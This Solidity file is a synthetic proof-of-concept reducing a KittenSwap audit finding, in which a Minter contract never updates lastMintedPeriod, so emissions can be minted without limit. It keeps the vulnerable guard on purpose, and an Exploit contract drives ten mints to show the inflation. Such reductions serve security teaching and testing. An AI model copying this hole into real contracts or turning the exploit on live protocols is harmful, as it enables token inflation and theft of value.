// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap — [C-02] Lack of `lastMintedPeriod` update allows unlimited minting of Kitten
    (Pashov Audit Group, KittenSwap-security-review 2025-06-12; #58066)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Minter.updatePeriod() mints weekly emissions when
    `currentPeriod > lastMintedPeriod` but never assigns
    `lastMintedPeriod = currentPeriod`, so once the first period elapses the
    guard is permanently true and Kitten can be minted indefinitely.

    Vulnerable condition preserved @>. No time warp needed: period starts at 1
    and lastMintedPeriod stays 0 forever under the bug. */

contract Kitten {
    string public constant name = "Kitten";
    string public constant symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public minter;

    function setMinter(address m) external {
        require(minter == address(0), "minter set");
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "only minter");
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Reduced Minter. updatePeriod body mirrors the audited logic: the
///      `currentPeriod > lastMintedPeriod` gate is present, the mint happens,
///      but lastMintedPeriod is never written.
contract Minter {
    Kitten public immutable kitten;
    address public immutable rebaseReward;
    address public immutable voter;

    /// @dev Weekly emissions (simplified fixed amount; real formula not needed).
    uint256 public weekly = 1_000 ether;

    /// @dev Starts at 0. After the first period elapses it should track
    ///      currentPeriod, but the bug never updates it.
    uint256 public lastMintedPeriod;

    /// @dev Period counter. Real code derives this from epoch timestamps;
    ///      here it is fixed at 1 so the first (and every subsequent) call
    ///      sees currentPeriod > lastMintedPeriod under the bug.
    uint256 public currentPeriod = 1;

    event Mint(address indexed sender, uint256 emissions, uint256 circulating, uint256 tail);

    constructor(Kitten _kitten, address _rebaseReward, address _voter) {
        kitten = _kitten;
        rebaseReward = _rebaseReward;
        voter = _voter;
    }

    /// @dev Meant to mint Kitten once per period for RebaseReward + Voter.
    function updatePeriod() external returns (bool) {
        if (currentPeriod > lastMintedPeriod) { // @> VULN: lastMintedPeriod never assigned → guard always true after period 1
            uint256 emissions = weekly;
            // Split emissions (simplified): half rebase, half voter gauges.
            kitten.mint(rebaseReward, emissions / 2);
            kitten.mint(voter, emissions - emissions / 2);

            emit Mint(msg.sender, emissions, kitten.totalSupply(), 0);

            // FIX: lastMintedPeriod = currentPeriod;
            // (missing — this is the entire bug)

            return true;
        }
        return false;
    }
}

/// @dev Stand-ins for the protocol recipients of minted Kitten.
contract RewardSink {
    // Holds minted Kitten; no logic needed for the mint-inflation finding.
}

contract Exploit {
    Kitten public kitten; // CREATE nonce 1
    RewardSink public rebaseReward; // CREATE nonce 2
    RewardSink public voter; // CREATE nonce 3
    Minter public minter; // CREATE nonce 4 — vulnerable

    uint256 public mintedExtra; // how much was over-minted beyond one legitimate period

    constructor() {
        kitten = new Kitten();
        rebaseReward = new RewardSink();
        voter = new RewardSink();
        minter = new Minter(kitten, address(rebaseReward), address(voter));
        kitten.setMinter(address(minter));
    }

    function run() external {
        uint256 before = kitten.totalSupply();
        require(before == 0, "pre: supply 0");
        require(minter.lastMintedPeriod() == 0, "pre: lastMintedPeriod 0");
        require(minter.currentPeriod() == 1, "pre: period 1");

        // First call — legitimate: currentPeriod (1) > lastMintedPeriod (0).
        require(minter.updatePeriod(), "first mint");
        uint256 afterFirst = kitten.totalSupply();
        require(afterFirst == minter.weekly(), "first period minted weekly");

        // Under a correct implementation lastMintedPeriod would now be 1 and
        // further calls would no-op. Under the bug lastMintedPeriod stays 0,
        // so every subsequent call remints the full weekly amount.
        for (uint256 i; i < 9; i++) {
            require(minter.updatePeriod(), "extra mint");
        }

        uint256 afterTen = kitten.totalSupply();
        // 10 successful mints × weekly
        require(afterTen == minter.weekly() * 10, "unlimited mint");
        // lastMintedPeriod was NEVER updated
        require(minter.lastMintedPeriod() == 0, "lastMintedPeriod still 0");

        // HARM: 9 extra weeks of emissions minted without advancing periods
        mintedExtra = afterTen - afterFirst;
        require(mintedExtra == minter.weekly() * 9, "extra not 9 weeks");
    }
}
